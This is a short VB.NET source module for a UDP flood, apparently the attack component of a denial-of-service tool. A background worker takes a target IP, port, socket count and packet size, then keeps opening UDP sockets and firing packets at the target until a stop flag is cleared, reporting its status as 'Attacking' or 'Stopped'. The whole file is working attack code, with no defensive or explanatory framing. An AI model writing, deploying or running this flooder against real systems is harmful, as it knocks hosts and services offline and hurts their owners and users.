﻿Imports System.Net
Imports System.Net.Sockets
Imports System.ComponentModel

Public Module UDP
    Public Enum Status
        Attacking = 1
        Stopped = 2
        Error_Host = 3
    End Enum

    Dim IP As IPAddress
    Public UDP_Host As String
    Public UDP_Port As Integer
    Public UDP_Sockets As Integer
    Public UDP_Packets As Integer
    Public WithEvents bgUdpFlood As New BackgroundWorker
    Public KeepFlooding As Boolean = False

    Public Sub bgUdpFlood_DoWork(ByVal sender As Object, ByVal e As DoWorkEventArgs) Handles bgUdpFlood.DoWork
        Try
            IP = IPAddress.Parse(UDP_Host)
        Catch
            bgUdpFlood.ReportProgress(Status.Error_Host)
            Exit Sub
        End Try
        Dim IPandPort As New IPEndPoint(IP, UDP_Port)
        Dim Packet As Byte() = New Byte(UDP_Packets) {}
        Dim SocketNum As Integer = UDP_Sockets
        bgUdpFlood.ReportProgress(Status.Attacking)
        Do While KeepFlooding = True
            For i = 0 To SocketNum
                If KeepFlooding = True Then
                    Dim _Sockets(i) As Socket
                    _Sockets(i) = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
                    Try
                        _Sockets(i).SendTo(Packet, IPandPort)
                    Catch ex As Exception
                    End Try
                Else
                    Exit Do
                End If
            Next
        Loop
        bgUdpFlood.ReportProgress(Status.Stopped)
    End Sub
End Module

